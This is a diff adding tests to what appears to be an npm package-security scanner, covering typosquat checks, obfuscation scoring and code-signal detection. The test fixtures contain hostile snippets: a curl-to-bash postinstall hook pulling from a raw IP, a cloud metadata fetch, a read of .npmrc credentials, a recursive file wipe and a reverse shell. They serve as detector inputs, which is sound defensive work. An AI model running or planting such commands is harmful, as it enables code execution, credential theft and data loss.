@@ -1,5 +1,5 @@
 import { test, expect } from "bun:test";
-import { scanShell, scanJs, analyze, type AnalysisInput } from "../src/index.ts";
+import { scanShell, scanJs, obfuscationScore, analyze, type AnalysisInput } from "../src/index.ts";
 
 function base(overrides: Partial<AnalysisInput> = {}): AnalysisInput {
   return {
@@ -143,6 +143,64 @@ test("established flag alone (downloads unknown) also suppresses scoped-imperson
 test("obscure scope wrapping a mega-popular name is still scoped-impersonation", () => {
   const s = analyze(base({ name: "@typescript_eslinter/eslint", meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 12 } }));
   expect(idsOf(s)).toContain("scoped-impersonation");
+});
+
+test("lifecycle script body with curl|bash yields script-* action signals", () => {
+  const s = analyze(base({ addedScripts: { postinstall: "curl http://185.1.2.3/x.sh | bash" } }));
+  expect(idsOf(s)).toContain("script-network");
+  expect(idsOf(s)).toContain("script-shell_exec");
+  expect(idsOf(s)).toContain("script-raw_ip");
+});
+
+test("each exfiltration/destructive code finding maps to its own signal", () => {
+  const s = analyze(
+    base({
+      scanFiles: [
+        { path: "imds.js", text: "fetch('http://169.254.169.254/latest/meta-data/');" },
+        { path: "dns.js", text: "const dns=require('dns');dns.lookup('x.example');" },
+        { path: "creds.js", text: "const fs=require('fs');fs.readFileSync(home + '/.npmrc');" },
+        { path: "wipe.js", text: "const fs=require('fs');fs.rmSync(dir,{recursive:true});" },
+        { path: "shell.js", text: "const net=require('net');const s=net.connect(1337,'h');const p=spawn('sh');s.pipe(p.stdin);" },
+      ],
+    }),
+  );
+  for (const id of ["code-metadata_host", "code-dns_egress", "code-fs_sensitive", "code-destructive_fs", "code-reverse_shell"]) {
+    expect(idsOf(s)).toContain(id);
+  }
+});
+
+test("scanJs detects new Function and ESM imports of exec/network modules", () => {
+  const kinds = scanJs("import cp from 'child_process';import net from 'node:net';const f=new Function('return 1');").map((f) => f.kind);
+  expect(kinds).toContain("eval");
+  expect(kinds).toContain("child_process");
+  expect(kinds).toContain("network");
+});
+
+test("long hex-escape runs are a hard obfuscation signature", () => {
+  const r = obfuscationScore("var s='" + "\\x41".repeat(30) + "';");
+  expect(r.hard).toBe(true);
+  expect(r.reason).toContain("hex-escape");
+});
+
+test("scanJs catches indirect eval", () => {
+  expect(scanJs("(0,eval)('x')").map((f) => f.kind)).toContain("eval");
+});
+
+test("obscure scope wrapping a non-popular name falls through without a scoped signal", () => {
+  const s = analyze(base({ name: "@somescope/utterly-unknown-pkg", meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 12 } }));
+  expect(s.find((x) => x.category === "typosquat")).toBeUndefined();
+});
+
+test("a raw URL/git dependency in package.json is flagged", () => {
+  const pkg = JSON.stringify({ dependencies: { evil: "git+https://github.com/x/evil.git", ok: "^1.0.0" } });
+  const s = analyze(base({ scanFiles: [{ path: "package.json", text: pkg }] }));
+  const d = s.find((x) => x.id === "direct-url-dependency");
+  expect(d?.evidence.detail).toContain("evil@git+https");
+});
+
+test("malformed package.json yields no manifest signal", () => {
+  const s = analyze(base({ scanFiles: [{ path: "package.json", text: "{not json" }] }));
+  expect(idsOf(s)).not.toContain("direct-url-dependency");
 });
 
 test("homoglyph squat of a top package is the strong homoglyph signal", () => {
